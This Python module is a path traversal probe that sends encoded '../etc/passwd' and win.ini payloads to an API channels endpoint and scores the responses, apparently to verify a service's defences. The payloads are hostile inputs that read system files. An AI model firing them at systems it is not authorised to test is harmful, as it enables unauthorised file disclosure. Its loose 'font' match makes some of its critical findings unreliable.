"""
Probe script to test Path Traversal vulnerabilities.
"""

import sys
import httpx
import asyncio
from .base_probe import BaseProbe, parse_args, run_probe, ProbeResult


def _get_traversal_payloads():
    return [
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "....//....//....//etc//passwd",
        "C:/Windows/win.ini",
        "../../../../Windows/win.ini",
    ]


def _analyze_traversal_response(result: ProbeResult, response: httpx.Response, payload: str):
    if response.status_code == 200:
        content = response.text.lower()
        if (
            "root:x:0:0" in content
            or "[extensions]" in content
            or "font" in content
        ):
            result.add_finding(
                "critical",
                f"Potential Arbitrary File Read with payload: {payload}",
            )
        else:
            result.add_finding(
                "info",
                "Server returned 200 for traversal payload "
                f"(Verify content manually): {payload}",
            )
    elif response.status_code == 500:
        result.add_finding(
            "medium",
            f"Server returned 500 (Unhandled exception for path: {payload})",
        )


class PathTraversalProbe(BaseProbe):
    async def run(self):
        print(f"[*] Starting Path Traversal Probe against {self.base_url}...", file=sys.stderr)
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            await self.check_url_path_traversal(client)
            # Add headers/query/body checks if file access endpoints exist

    @staticmethod
    def _should_record_result(result: ProbeResult) -> bool:
        return (
            bool(result.findings)
            or result.status_code == 200
            or result.status_code == 500
        )

    async def check_url_path_traversal(self, client):
        """Check traversal in URL path segments."""
        payloads = _get_traversal_payloads()

        for payload in payloads:
            endpoint = f"/api/v2/channels/{payload}"
            result = ProbeResult("Path Traversal in URL", endpoint)

            try:
                response = await client.get(
                    f"{self.base_url}{endpoint}",
                    headers=self.get_headers()
                )
                result.status_code = response.status_code
                _analyze_traversal_response(result, response, payload)
            except Exception as e:
                result.error = str(e)

            if self._should_record_result(result):
                self.results.append(result)

if __name__ == "__main__":
    args = parse_args("Verify Path Traversal defenses")
    asyncio.run(run_probe(PathTraversalProbe, args))
